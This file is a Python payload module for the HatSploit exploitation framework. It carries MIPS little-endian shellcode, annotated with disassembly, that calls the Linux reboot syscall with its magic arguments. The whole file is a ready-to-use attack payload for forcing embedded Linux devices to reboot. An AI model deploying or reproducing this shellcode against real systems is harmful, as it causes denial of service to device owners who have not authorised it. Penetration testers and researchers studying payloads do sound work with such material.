#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "stager",
        'Name': "Linux mipsle Reboot",
        'Payload': "linux/mipsle/reboot",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Reboot payload for Linux mipsle.",
        'Architecture': "mipsle",
        'Platform': "linux",
        'Rank': "low",
        'Type': "one_side"
    }

    def run(self):
        return (
            b"\x21\x43\x06\x3c"  # lui     a2,0x4321
            b"\xdc\xfe\xc6\x34"  # ori     a2,a2,0xfedc
            b"\x12\x28\x05\x3c"  # lui     a1,0x2812
            b"\x69\x19\xa5\x34"  # ori     a1,a1,0x1969
            b"\xe1\xfe\x04\x3c"  # lui     a0,0xfee1
            b"\xad\xde\x84\x34"  # ori     a0,a0,0xdead
            b"\xf8\x0f\x02\x24"  # li      v0,4088
            b"\x0c\x01\x01\x01"  # syscall 0x40404
        )
